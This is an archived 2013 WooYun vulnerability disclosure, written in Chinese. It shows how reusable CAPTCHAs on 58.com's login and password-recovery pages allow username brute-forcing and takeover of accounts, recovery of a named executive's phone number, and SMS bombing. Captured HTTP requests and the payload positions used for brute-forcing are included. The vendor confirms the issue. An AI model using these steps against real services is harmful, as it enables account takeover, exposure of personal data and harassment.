<!doctype html>
                        <html lang="en">
                        <head>
	                        <meta charset="UTF-8">
	                        <title>		58同城某处鸡肋设计缺陷的三种猥琐利用~  </title>
	                        <link href="../css/css.css" rel="stylesheet" /> 
                        </head>
                        <body> 
                        <ul><li>标题：		58同城某处鸡肋设计缺陷的三种猥琐利用~  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/niliu">niliu</a> 
</li><li>提交时间：		2013-09-27 12:18</li></ul>
                        <div class="con">
                        <h2>漏洞详情</h2>
		<h3 class="detailTitle">披露状态：</h3>
		<p class="detail" style="padding-bottom:0">
					</p>
		<p class="detail">
									2013-09-27：	细节已通知厂商并且等待厂商处理中<br/>
									2013-09-27：	厂商已经确认，细节仅向厂商公开<br/>
									2013-10-07：	细节向核心白帽子及相关领域专家公开<br/>
									2013-10-17：	细节向普通白帽子公开<br/>
									2013-10-27：	细节向实习白帽子公开<br/>
									2013-11-11：	细节向公众公开<br/>
					</p>
		<h3 class="detailTitle">简要描述：</h3>

		<p class="detail">#鸡肋烤的好了吃着也香~<br />
<br />
#对之前提交的一个没有通过的鸡肋设计缺陷的三种猥琐利用~<br />
<br />
#~1可修改他人账号密码并成功登陆~<br />
<br />
#~2可获取58内部领导手机号~<br />
<br />
#~3对获取的58内部领导手机号进行短信轰炸~<br />
</p>

				
						<h3 class="detailTitle">详细说明：</h3>
		
			<p class="detail">利用之前一个小缺陷可实现以下3个方面的利用<br />
<br />
#~1可修改他人账号密码并成功登陆~<br />
<br />
#~2可获取58内部领导手机号~<br />
<br />
#~3对获取的58内部领导手机号进行短信轰炸~<br />
<br />
---------------------------------------------------------------------<br />
<br />
问题描述：验证码没有限制有效次数，可多次使用<br />
<br />
#~1可修改他人账号密码并成功登陆~<br />
<br />
登陆页面验证码无使用次数限制可暴力破解他人账号<br />
<br />
<br />
<br />
首先以用户admin密码123456正常登陆几次，因为前几次登陆是没有验证码的，所以等弹出验证码后再登陆，登陆时抓包<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/27105059eb0f4ce665e71019d5cbaf7f7b4f9a8e.jpg" target="_blank"><img src="../images/27105059eb0f4ce665e71019d5cbaf7f7b4f9a8e.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
</p><pre><code>POST /dounionlogin HTTP/1.1<br />
Host: passport.58.com<br />
Proxy-Connection: keep-alive<br />
Content-Length: 556<br />
Cache-Control: max-age=0<br />
Origin: http://passport.58.com<br />
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Maxthon/4.0.3.6000 Chrome/22.0.1229.79 Safari/537.1<br />
Content-Type: application/x-www-form-urlencoded<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
DNT: 1<br />
Referer: http://passport.58.com/login?path=http%3A%2F%2Fmy.58.com%2Fmyseekjob%2F1<br />
Accept-Encoding: gzip,deflate<br />
Accept-Language: zh-CN<br />
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
Cookie: @#￥…&amp;%*%…#￥%<br />
<br />
isweak=1&amp;path=http%3A%2F%2Fmy.58.com%2Fmyseekjob%2F1%3Fpts%3D1380250216822&amp;p1=81258169aec0e3c8bef5475baf3cb569&amp;p2=662512780135bf0052f54e50140d8790&amp;p3=81c7f75b45073d4e50c808255cfe48a244f7596a079ac943da4bdeadeb55efed7f7ee1ab4ebfeac9e6d8b834d2d7ccc2f16ab5ec3c4399416573963999eb7d212daf58024b346fc05101221973e354525894a5f4088e61446b9b7866be6aab6a7ee0012713a11c2d1e452fe13434b9064b2a1f94a18dbc65d90c43a66afebd31&amp;timesign=1380250281659&amp;ptk=ffe232eb18464856839b4b5c42a2e438&amp;cd=1864&amp;username=admin&amp;password=password&amp;validatecode=de22q&amp;mcresult=48484849485349505453</code></pre><p class='detail'><br />
<br />
<br />
<br />
然后以密码不变，对用户名参数username进行破解<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/271053575f33cf4f1b2caee06797380991194a19.jpg" target="_blank"><img src="../images/271053575f33cf4f1b2caee06797380991194a19.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
根据测试得知返回包长度为628的可登陆成功<br />
<br />
<br />
<br />
shi：123456 登陆时会跳转到一个更改密码的页面<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/27111719b35aa047a149db73d2a2380b11dde395.jpg" target="_blank"><img src="../images/27111719b35aa047a149db73d2a2380b11dde395.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
旧密码就是123456，虽然需要填写手机接收验证码但是填写自己的可以成功接收并更改密码。<br />
<br />
<br />
<br />
登陆截图<br />
<br />
<br />
<br />
用户shi<br />
<br />
</p><p class="detail"><a href="../images/271122020cbf5cab7d7a78fd932e3f64bb7f3ee1.jpg" target="_blank"><img src="../images/271122020cbf5cab7d7a78fd932e3f64bb7f3ee1.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
用户简历<br />
<br />
</p><p class="detail"><a href="../images/27112258a4ffa6294dd8659921a726cf068ae0b7.jpg" target="_blank"><img src="../images/27112258a4ffa6294dd8659921a726cf068ae0b7.jpg" alt="5.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
用户 xie<br />
<br />
</p><p class="detail"><a href="../images/271126300e037fa100e719aae2668930f264879e.jpg" target="_blank"><img src="../images/271126300e037fa100e719aae2668930f264879e.jpg" alt="6.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
用户密码都被修改了，你说能干什么呢？<br />
<br />
---------------------------------------------------------------------<br />
<br />
#~2可获取58内部领导手机号~<br />
<br />
<br />
<br />
找回密码页面验证码同样的问题，可根据邮箱找回密码获取用户手机号码<br />
<br />
<br />
<br />
这里就对姚劲波的邮箱做个测试<br />
<br />
<br />
<br />
</p><pre><code>http://passport.58.com/forgetpassword</code></pre><p class='detail'><br />
<br />
<br />
<br />
填写好邮箱yaojb@58.com验证码提交<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/2711541862a8a9c5192d8d894867b5e00c01ee70.jpg" target="_blank"><img src="../images/2711541862a8a9c5192d8d894867b5e00c01ee70.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
来到验证页面<br />
<br />
<br />
<br />
根据提示可得知前7位手机号为13910**<br />
<br />
<br />
<br />
后四位暂时写1111，提交时抓包<br />
<br />
</p><p class="detail"><a href="../images/27145821e4db7e75cfc26173c521c3a97cc9bd4c.jpg" target="_blank"><img src="../images/27145821e4db7e75cfc26173c521c3a97cc9bd4c.jpg" alt="8.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
</p><pre><code>GET /forgetbymobile?mobile=13910**§1111§&amp;validatecode=HDSZN HTTP/1.1<br />
Host: passport.58.com<br />
Proxy-Connection: keep-alive<br />
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Maxthon/4.0.3.6000 Chrome/22.0.1229.79 Safari/537.1<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
DNT: 1<br />
Referer: http://passport.58.com/resetbymobile<br />
Accept-Encoding: gzip,deflate<br />
Accept-Language: zh-CN<br />
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
Cookie: #@##￥……&amp;#￥</code></pre><p class='detail'><br />
<br />
<br />
<br />
对手机号参数mobile的后四位1111进行破解<br />
<br />
</p><p class="detail"><a href="../images/16181224b3dcb8dadbbaa2d92d4f6fcdae1e3186.jpg" target="_blank"><img src="../images/16181224b3dcb8dadbbaa2d92d4f6fcdae1e3186.jpg" alt="9.jpg" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
根据返回包才长度可得知手机号后四位为70**<br />
<br />
<br />
<br />
这样就得到了姚劲波的手机号，当然不限于他的手机号，这里就不再做其他证明了。<br />
<br />
<br />
<br />
---------------------------------------------------------------------<br />
<br />
#~3对获取的58内部领导手机号进行短信轰炸~<br />
<br />
<br />
<br />
得到手机号了有什么用处呢？<br />
<br />
<br />
<br />
继续猥琐，手机号进行一次短信轰炸，当然这里掩饰就拿自己手机号测试~<br />
<br />
<br />
<br />
利用之前的方法获取到真实手机号后，填写好，点发送确认码时抓包<br />
<br />
<br />
<br />
</p><pre><code>GET /forgetbymobile?mobile=186******04&amp;validatecode=pakpe HTTP/1.1<br />
Host: passport.58.com<br />
Connection: keep-alive<br />
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Maxthon/4.0.3.6000 Chrome/22.0.1229.79 Safari/537.1<br />
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
DNT: 1<br />
Referer: https://passport.58.com/resetbymobile<br />
Accept-Encoding: gzip,deflate<br />
Accept-Language: zh-CN<br />
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3<br />
Cookie: @#￥%</code></pre><p class='detail'><br />
<br />
<br />
<br />
这里前端虽然做了短信验证码接受时间限制，但是通过抓包发包可绕过限制进行短信轰炸~<br />
<br />
<br />
<br />
拿自己手机测试截图<br />
<br />
<br />
<br />
</p><p class="detail"><a href="../images/27120952a686ed7ba20c8459424787c90262adc6.png" target="_blank"><img src="../images/27120952a686ed7ba20c8459424787c90262adc6.png" alt="11.png" width="600"/></a></p><p class="detail"><br />
<br />
<br />
<br />
姚总日理万机我就不骚扰他了~<br />
<br />
 </p>
				
									<h3 class="detailTitle">漏洞证明：</h3>

			<p class="detail">综上所述~ </p>

									<h3 class="detailTitle">修复方案：</h3>
			<p class="detail">对验证码有效使用次数做限制~<br />
<br />
<br />
<br />
顺便求个58的小礼物吧~<br />
<br />
<br />
<br />
:D </p>
										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/niliu" title="niliu">niliu</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-038329" title="58同城某处鸡肋设计缺陷的三种猥琐利用~">乌云</a></h3>
		<hr align="center"/>

				
			<h2>漏洞回应</h2>
			
			
															<h3 class="detailTitle">厂商回应：</h3>
						<p class="detail">危害等级：中</p>
						<p class="detail">漏洞Rank：8 </p>
													<p class="detail">确认时间：2013-09-27 14:35</p>
												<h3 class="detailTitle">厂商回复：</h3>				
						<p class="detail">感谢对58的关注和支持！我们会尽快修复处理！<br />
<br />
晚些时候会索要联系方式，礼品是必须的！</p>
					

					
					
					<h3 class="detailTitle">最新状态：</h3>

											<p class="detail">暂无</p>
					

							
					
		
<hr align="center" />
<script type="text/javascript">
var bugid="38329";
var bugRating="-3";
var myRating="";
var ratingCount="0";



function ShowBugRating(k){
	var ratingItems=$(".myrating span");
	$.each(ratingItems,function(i,n){
		var nk=parseInt($(n).attr("rel"));
		if(nk<=k){
			$(n).addClass("on");
		}else{
			$(n).removeClass("on");
		}
	});
	$(".myrating span").hover(
		function(){
			$("#ratingShow").html($(this).attr("data-title"));
		},
		function(){
			$("#ratingShow").html("");
		}
	);
}
$(document).ready(function(){
	if(myRating==""){
		var ratingItems=$(".myrating span");
		$(".myrating span").hover(
			function(){
				$(this).addClass("hover");
				var k=parseInt($(this).attr("rel"));
				$.each(ratingItems,function(i,n){
					var nk=parseInt($(n).attr("rel"));
					if(nk<k) $(n).addClass("on");
					if(nk>k) $(n).removeClass("on");
				});
				$("#ratingShow").html($(this).attr("data-title"));
			},
			function(){
				$(this).removeClass("hover");
				if($("#myRating").val()==""){
					$.each(ratingItems,function(i,n){
						$(n).removeClass("on");
					});
				}
				$("#ratingShow").html("");
			}
		);

		$(".myrating span").click(function(){
			var rating=$(this).attr("rel");
			var k=parseInt($(this).attr("rel"));
			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
				//消除操作绑定
				$(".myrating span").unbind();
				re=parseInt(re);
				switch(re){
					case 1:
						$("#ratingShow").html("评分成功");
						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
						$.each(ratingItems,function(i,n){
							var nk=parseInt($(n).attr("rel"));
							if(nk<=k){
								$(n).addClass("on");
							}else{
								$(n).removeClass("on");
							}
						});
						ShowBugRating(rating);
						break;
					case 2:
						$("#ratingShow").html("请先登录");
						break;
					case 4:
						$("#ratingShow").html("已对此漏洞进行过评分");
						break;
					case 6:
						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
						break;
					default:break;
				}
			});
		});
	}else{
		if(ratingCount>2){
			ShowBugRating(bugRating);
		}else{
			ShowBugRating(-3);
		}
	}
});

</script>
<h3 class="detailTitle">漏洞评价：</h3>
                        </div>
                        </body>
                        </html>
